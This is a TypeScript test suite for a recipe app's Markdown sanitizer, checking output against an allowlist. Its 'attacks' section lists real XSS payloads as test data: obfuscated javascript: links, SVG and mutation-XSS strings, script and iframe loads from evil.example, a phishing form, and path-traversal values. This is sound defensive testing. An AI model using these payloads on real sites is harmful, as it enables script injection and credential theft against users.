import { JSDOM } from 'jsdom';
import { describe, expect, it } from 'vitest';
import {
	ALLOWED_ATTR,
	ALLOWED_TAGS,
	renderMarkdown,
	safeLinkUrl,
	type MarkdownImage
} from '$lib/server/markdown';

/**
 * The Markdown renderer is the one place this application hands a string to
 * `{@html}`, so these cases are mostly attacks.
 *
 * Every payload below is a real one — the kind that works against a renderer
 * that trusts `marked` to sanitize (it does not), or that filters `javascript:`
 * with a pattern instead of a parser. Each is checked two ways: for the
 * specific thing it tries to smuggle through, and against the structural
 * invariant that matters more than any single case — every element and
 * attribute in the output is on the allowlist, every link is http(s), mailto
 * or tel, and every image is served by this application.
 */

const PHOTO: MarkdownImage = {
	id: '0b7a3c52-6f1e-4c8e-9d2a-5e4f3a2b1c0d',
	width: 1024,
	height: 768
};

/** The references the importer recorded for an imagined recipe page. */
const IMAGES = new Map<string, MarkdownImage>([
	['Lemon Drizzle Loaf/crumb shot.png', PHOTO],
	[
		'Lemon Drizzle Loaf/tin_(1).png',
		{ id: '9c1d2e3f-4a5b-4c6d-8e7f-0a1b2c3d4e5f', width: null, height: null }
	]
]);

const parse = (html: string) => new JSDOM(`<body>${html}</body>`).window.document.body;

/** The wrapper the renderer puts around a table, and the attributes it sets. */
const WRAPPER_TAGS = new Set(['div']);
const POLICY_ATTRS = new Set(['rel', 'target', 'width', 'height', 'loading', 'decoding']);
const WRAPPER_ATTRS = new Set(['class', 'role', 'aria-label', 'tabindex']);
const MEDIA = /^\/api\/media\/[0-9a-f-]{36}$/;

/**
 * Asserts the output contains nothing off the allowlist, whatever went in.
 * Parsed rather than pattern-matched, so it sees what a browser would.
 */
function expectOnlyAllowed(html: string) {
	const body = parse(html);
	for (const el of body.querySelectorAll('*')) {
		const tag = el.tagName.toLowerCase();
		const isWrapper = WRAPPER_TAGS.has(tag) && el.getAttribute('class') === 'md-table';
		expect(
			(ALLOWED_TAGS as readonly string[]).includes(tag) || isWrapper,
			`<${tag}> in ${html}`
		).toBe(true);
		for (const name of el.getAttributeNames()) {
			const allowed =
				(ALLOWED_ATTR as readonly string[]).includes(name) ||
				POLICY_ATTRS.has(name) ||
				(isWrapper && WRAPPER_ATTRS.has(name));
			expect(allowed, `${name}= on <${tag}> in ${html}`).toBe(true);
		}
		if (el.hasAttribute('href')) {
			expect(el.getAttribute('href')).toMatch(/^(https?:|mailto:|tel:)/);
		}
		if (el.hasAttribute('src')) expect(el.getAttribute('src')).toMatch(MEDIA);
		// No attribute carries a script URL, whatever it is called. Text may
		// mention one — "javascript:alert(1)" as words is harmless — so this
		// looks at attribute values rather than at the string.
		for (const name of el.getAttributeNames()) {
			expect(el.getAttribute(name), `${name}= on <${tag}>`).not.toMatch(
				/^\s*(javascript|vbscript|data):/i
			);
		}
	}
	expect(html).not.toMatch(/<\s*script/i);
}

const render = (source: string) => {
	const html = renderMarkdown(source, { images: IMAGES });
	expectOnlyAllowed(html);
	return html;
};

describe('attacks', () => {
	it('drops a script element and its contents', () => {
		const html = render('Before\n\n<script>alert(document.cookie)</script>\n\nAfter');
		expect(html).not.toContain('alert');
		expect(html).toContain('Before');
		expect(html).toContain('After');
	});

	it('drops a script however it is spelt', () => {
		for (const payload of [
			'<SCRIPT SRC=https://evil.example/x.js></SCRIPT>',
			'<scr<script>ipt>alert(1)</script>',
			'<script\n>alert(1)</script\n>',
			'<<script>script>alert(1)<</script>/script>'
		]) {
			expect(render(payload), payload).not.toMatch(/<script/i);
		}
	});

	it('strips an event handler from an image, and drops an image it cannot resolve', () => {
		const html = render('<img src=x onerror=alert(1)>');
		expect(html).not.toContain('onerror');
		expect(parse(html).querySelector('img')).toBeNull();
	});

	it('strips an event handler even from an image it keeps', () => {
		const html = render('<img src="Lemon Drizzle Loaf/crumb shot.png" onerror="alert(1)">');
		const img = parse(html).querySelector('img');
		expect(img?.getAttribute('src')).toBe(`/api/media/${PHOTO.id}`);
		expect(img?.hasAttribute('onerror')).toBe(false);
	});

	it('strips event handlers from ordinary elements', () => {
		const html = render(
			'<p onmouseover="alert(1)">Hover</p>\n\n<a href="https://example.com" onclick="alert(1)">x</a>'
		);
		expect(html).toContain('Hover');
		expect(parse(html).querySelector('a')?.getAttribute('href')).toBe('https://example.com/');
	});

	it('removes an SVG, including one that runs on load', () => {
		for (const payload of [
			'<svg onload=alert(1)>',
			'<svg><script>alert(1)</script></svg>',
			'<svg><a xlink:href="javascript:alert(1)"><text x="20" y="20">tap</text></a></svg>',
			'<svg><animate onbegin=alert(1) attributeName=x dur=1s>'
		]) {
			const html = render(payload);
			expect(html, payload).not.toMatch(/<svg|<animate/i);
			expect(html, payload).not.toContain('alert');
		}
	});

	it('refuses a javascript: link written as Markdown', () => {
		const html = render('[Open the recipe](javascript:alert(1))');
		expect(parse(html).querySelector('a')).toBeNull();
		// The words are kept; only the link is gone.
		expect(html).toContain('Open the recipe');
	});

	it('refuses a javascript: link written as HTML', () => {
		const html = render('<a href="javascript:alert(1)">Open</a>');
		expect(parse(html).querySelector('a')).toBeNull();
		expect(html).toContain('Open');
	});

	it('refuses a javascript: autolink', () => {
		// CommonMark autolinks accept any scheme, so `marked` emits this as a
		// live link on its own. The words survive as words.
		const html = render('<javascript:alert(1)>');
		expect(parse(html).querySelector('a')).toBeNull();
		expect(html).toBe('<p>javascript:alert(1)</p>');
	});

	it('refuses javascript: links hidden by encoding, case and whitespace', () => {
		for (const payload of [
			'[x](&#106;avascript:alert(1))',
			'[x](&#x6A;&#x61;&#x76;&#x61;script:alert(1))',
			'[x](JaVaScRiPt:alert(1))',
			'[x](java&#x09;script:alert(1))',
			'[x](java&#10;script:alert(1))',
			'<a href="&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;alert(1)">x</a>',
			'<a href="&#x6A;avascript&colon;alert(1)">x</a>',
			'<a href="  javascript:alert(1)">x</a>',
			'<a href="java\tscript:alert(1)">x</a>',
			'<a href="&#0000106avascript:alert(1)">x</a>',
			'[x](vbscript:msgbox(1))',
			'[x](%6Aavascript:alert(1))'
		]) {
			const html = render(payload);
			expect(parse(html).querySelector('a'), payload).toBeNull();
		}
	});

	it('refuses data: URLs in links and images', () => {
		for (const payload of [
			'[x](data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==)',
			'<a href="data:text/html,<script>alert(1)</script>">x</a>',
			'![x](data:image/svg+xml;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+)',
			'<img src="data:image/png;base64,iVBORw0KGgo=">'
		]) {
			const body = parse(render(payload));
			expect(body.querySelector('a, img'), payload).toBeNull();
		}
	});

	it('allows only its own short list of link schemes, not the sanitizer’s longer one', () => {
		// DOMPurify on its own lets these through; the renderer's own check is
		// what refuses them. Without this case that check could be deleted and
		// every javascript: test above would still pass, because DOMPurify
		// catches those first.
		for (const payload of [
			'[x](ftp://files.example/x)',
			'[x](sms:+15555550100)',
			'[x](callto:someone)',
			'[x](xmpp:someone@example.com)',
			'[x](cid:part1)'
		]) {
			expect(parse(render(payload)).querySelector('a'), payload).toBeNull();
		}
	});

	it('refuses a javascript: image source', () => {
		expect(parse(render('<img src="javascript:alert(1)">')).querySelector('img')).toBeNull();
		expect(parse(render('![x](javascript:alert(1))')).querySelector('img')).toBeNull();
	});

	it('removes iframes, frames, objects and embeds', () => {
		const html = render(
			[
				'<iframe src="https://evil.example"></iframe>',
				'<iframe srcdoc="<script>alert(1)</script>"></iframe>',
				'<object data="https://evil.example/x.swf"></object>',
				'<embed src="https://evil.example/x.swf">',
				'<frameset><frame src="https://evil.example"></frameset>'
			].join('\n\n')
		);
		expect(html).not.toMatch(/<(iframe|object|embed|frame)/i);
		expect(html).not.toContain('evil.example');
	});

	it('removes forms and every input but a disabled checkbox', () => {
		const html = render(
			'<form action="https://evil.example/steal" method="post">' +
				'<input name="password" type="password" placeholder="Password">' +
				'<input type="text" value="phish"><input type="image" src="x">' +
				'<button formaction="javascript:alert(1)">Sign in</button></form>'
		);
		const body = parse(html);
		expect(body.querySelector('form, button, input')).toBeNull();
		expect(html).not.toContain('evil.example');
	});

	it('removes style elements and style attributes', () => {
		const html = render(
			'<style>body { display: none }</style>\n\n' +
				'<p style="position:fixed;inset:0;background:url(https://evil.example/x)">Covered</p>'
		);
		expect(html).not.toMatch(/<style|style=/i);
		expect(html).not.toContain('display: none');
		expect(html).toContain('Covered');
	});

	it('removes elements that change how the page itself loads', () => {
		const html = render(
			'<base href="https://evil.example/">\n\n' +
				'<meta http-equiv="refresh" content="0;url=https://evil.example">\n\n' +
				'<link rel="stylesheet" href="https://evil.example/x.css">'
		);
		expect(html).not.toMatch(/<(base|meta|link)/i);
	});

	it('strips ids, names and classes that could clobber or restyle the page', () => {
		const html = render(
			'<p id="app" class="sr-only" name="body" data-x="1" aria-hidden="true">Hi</p>'
		);
		const p = parse(html).querySelector('p');
		expect(p?.getAttributeNames()).toEqual([]);
	});

	it('survives the mutation XSS payloads that beat older sanitizers', () => {
		for (const payload of [
			'<math><mtext><table><mglyph><style><img src=x onerror=alert(1)>',
			'<noscript><p title="</noscript><img src=x onerror=alert(1)>">',
			'<svg></p><style><a id="</style><img src=1 onerror=alert(1)>">',
			'<form><math><mtext></form><form><mglyph><style></math><img src onerror=alert(1)>',
			'<table><caption><svg><title><img src=x onerror=alert(1)></title></svg></caption></table>',
			'<xmp><p title="</xmp><img src=x onerror=alert(1)>">'
		]) {
			const html = render(payload);
			expect(html, payload).not.toContain('onerror');
		}
	});

	it('treats a raw HTML block as untrusted like any other', () => {
		// Markdown passes an HTML block through untouched, which is how every
		// payload above reaches the sanitizer in the first place.
		const html = render(
			'<div onclick="alert(1)">\n<b>Bold</b> and <u>underlined</u>\n</div>\n\nAfter the block'
		);
		expect(html).toContain('<b>Bold</b>');
		expect(html).toContain('underlined');
		expect(html).not.toMatch(/<div|<u>/);
	});

	it('never emits an external image, which would be a tracking pixel', () => {
		for (const payload of [
			'![pixel](https://tracker.example/p.gif)',
			'<img src="https://tracker.example/p.gif">',
			'<img src="//tracker.example/p.gif">'
		]) {
			expect(parse(render(payload)).querySelector('img'), payload).toBeNull();
		}
	});

	it('does not let a link choose where it opens', () => {
		const a = parse(
			render('<a href="https://example.com" target="_self" rel="opener">x</a>')
		).querySelector('a');
		expect(a?.getAttribute('target')).toBe('_blank');
		expect(a?.getAttribute('rel')).toBe('noopener noreferrer');
	});
});

describe('recipes as the household writes them', () => {
	const RECIPE = `## Ingredients

- 2 lemons, zested
- 175 g caster sugar
- [ ] Buy more flour
- [x] Grease the tin

## Method

1. Heat the oven to 180°C.
2. Beat the butter and sugar **until pale**.
3. Fold in the flour, then *gently* the zest.

> Don't open the oven for the first 30 minutes.

| Tin | Time | Temperature |
|:----|-----:|:-----------:|
| 900 g loaf | 45 min | 180°C |
| 20 cm round | 35 min | 180°C |

---

Adapted from [the original](https://example.com/recipes/lemon-drizzle). Use \`caster\` sugar.
Line two of the same paragraph.

![The crumb](Lemon%20Drizzle%20Loaf/crumb%20shot.png)`;

	const html = render(RECIPE);
	const body = parse(html);

	it('keeps headings, one level under the card they sit in', () => {
		const shifted = parse(renderMarkdown(RECIPE, { headingOffset: 2 }));
		expect([...shifted.querySelectorAll('h4')].map((h) => h.textContent)).toEqual([
			'Ingredients',
			'Method'
		]);
		expect(shifted.querySelector('h1, h2')).toBeNull();
		// Unshifted, the source's own levels.
		expect(body.querySelectorAll('h2')).toHaveLength(2);
	});

	it('never shifts a heading past h6', () => {
		const deep = parse(renderMarkdown('##### Five\n\n###### Six', { headingOffset: 3 }));
		expect([...deep.querySelectorAll('h6')].map((h) => h.textContent)).toEqual(['Five', 'Six']);
	});

	it('keeps numbered steps as an ordered list', () => {
		const steps = [...body.querySelectorAll('ol > li')].map((li) => li.textContent?.trim());
		expect(steps).toEqual([
			'Heat the oven to 180°C.',
			'Beat the butter and sugar until pale.',
			'Fold in the flour, then gently the zest.'
		]);
		expect(body.querySelector('ol strong')?.textContent).toBe('until pale');
		expect(body.querySelector('ol em')?.textContent).toBe('gently');
	});

	it('keeps a task list as disabled ticks, checked where the source was', () => {
		const boxes = [...body.querySelectorAll('li > input')];
		expect(boxes).toHaveLength(2);
		expect(boxes.every((b) => b.getAttribute('type') === 'checkbox')).toBe(true);
		expect(boxes.every((b) => b.hasAttribute('disabled'))).toBe(true);
		expect(boxes.map((b) => b.hasAttribute('checked'))).toEqual([false, true]);
	});

	it('keeps a table, inside a container that scrolls on its own', () => {
		const frame = body.querySelector('div.md-table');
		expect(frame?.getAttribute('tabindex')).toBe('0');
		expect(frame?.getAttribute('role')).toBe('region');
		const table = frame?.querySelector('table');
		expect([...(table?.querySelectorAll('th') ?? [])].map((th) => th.textContent)).toEqual([
			'Tin',
			'Time',
			'Temperature'
		]);
		expect(table?.querySelectorAll('tbody tr')).toHaveLength(2);
		expect(table?.querySelector('td')?.getAttribute('align')).toBe('left');
	});

	it('keeps a quote, a rule, inline code and a line break', () => {
		expect(body.querySelector('blockquote')?.textContent).toContain('first 30 minutes');
		expect(body.querySelector('hr')).not.toBeNull();
		expect(body.querySelector('code')?.textContent).toBe('caster');
		expect(body.querySelector('p br')).not.toBeNull();
	});

	it('opens an external link in a new tab without handing it this window', () => {
		const a = body.querySelector('a');
		expect(a?.getAttribute('href')).toBe('https://example.com/recipes/lemon-drizzle');
		expect(a?.getAttribute('target')).toBe('_blank');
		expect(a?.getAttribute('rel')).toBe('noopener noreferrer');
	});

	it('serves an image the import stored, from this application', () => {
		const img = body.querySelector('img');
		expect(img?.getAttribute('src')).toBe(`/api/media/${PHOTO.id}`);
		expect(img?.getAttribute('alt')).toBe('The crumb');
		expect(img?.getAttribute('width')).toBe('1024');
		expect(img?.getAttribute('height')).toBe('768');
		expect(img?.getAttribute('loading')).toBe('lazy');
	});

	it('resolves a reference with brackets and angle-bracket syntax', () => {
		const img = parse(render('![tin](<Lemon Drizzle Loaf/tin_(1).png>)')).querySelector('img');
		expect(img?.getAttribute('src')).toBe('/api/media/9c1d2e3f-4a5b-4c6d-8e7f-0a1b2c3d4e5f');
		// No stored dimensions, so none invented.
		expect(img?.hasAttribute('width')).toBe(false);
	});

	it('drops an image it has no stored copy of, and the gap it leaves', () => {
		const html = render(
			'Before\n![lost](Lemon%20Drizzle%20Loaf/missing.png)\n\n![](elsewhere.png)\n\nAfter'
		);
		const out = parse(html);
		expect(out.querySelector('img')).toBeNull();
		expect([...out.querySelectorAll('p')].map((p) => p.innerHTML)).toEqual(['Before', 'After']);

		// On a line of its own inside a paragraph: one line break, not two.
		expect(render('Before\n![lost](missing.png)\nAfter')).toBe('<p>Before<br>After</p>');
	});

	it('drops an image whose stored id is not an id', () => {
		// The map is built from the database, but the id lands in a URL on the
		// page, so it is checked here as well rather than trusted.
		const images = new Map([['odd.png', { id: '../../../etc/passwd', width: 1, height: 1 }]]);
		expect(renderMarkdown('![x](odd.png)', { images })).toBe('');
	});

	it('builds image URLs with the base path it is given', () => {
		const img = parse(
			renderMarkdown('![x](Lemon%20Drizzle%20Loaf/crumb%20shot.png)', {
				images: IMAGES,
				mediaUrl: (id) => `/life/api/media/${id}`
			})
		).querySelector('img');
		expect(img?.getAttribute('src')).toBe(`/life/api/media/${PHOTO.id}`);
	});

	it('keeps the words of a link into the Notion export, without the link', () => {
		const html = render(
			'Serve with [Cheddar](../Ingredients%20Database/Cheddar%20fffffffffffffffffffffffffffffff1.md).'
		);
		expect(parse(html).querySelector('a')).toBeNull();
		expect(parse(html).textContent?.trim()).toBe('Serve with Cheddar.');
	});

	it('keeps the text of a Notion callout', () => {
		const html = render('<aside>\n💡 Rest the dough overnight.\n</aside>');
		expect(html).toContain('Rest the dough overnight.');
		expect(html).not.toContain('<aside');
	});

	it('allows mail and phone links, without sending them to a new tab', () => {
		const out = parse(render('[Email](mailto:cook@example.com) or [call](tel:+15555550100)'));
		const [mail, tel] = [...out.querySelectorAll('a')];
		expect(mail?.getAttribute('href')).toBe('mailto:cook@example.com');
		expect(tel?.getAttribute('href')).toBe('tel:+15555550100');
		expect(mail?.hasAttribute('target')).toBe(false);
	});

	it('renders nothing for nothing', () => {
		expect(renderMarkdown(null)).toBe('');
		expect(renderMarkdown('')).toBe('');
		expect(renderMarkdown('  \n\n ')).toBe('');
	});
});

describe('a bare link field', () => {
	it('accepts web, mail and phone addresses', () => {
		expect(safeLinkUrl('https://example.com/a b')).toBe('https://example.com/a%20b');
		expect(safeLinkUrl(' http://example.com ')).toBe('http://example.com/');
		expect(safeLinkUrl('mailto:cook@example.com')).toBe('mailto:cook@example.com');
	});

	it('refuses anything else, including what only looks like a web address', () => {
		for (const value of [
			'javascript:alert(1)',
			'JAVASCRIPT:alert(1)',
			'java\tscript:alert(1)',
			'\u0001javascript:alert(1)',
			'data:text/html,hi',
			'vbscript:x',
			'file:///etc/passwd',
			'www.example.com',
			'/food',
			'',
			null,
			undefined
		]) {
			expect(safeLinkUrl(value), String(value)).toBeNull();
		}
	});
});
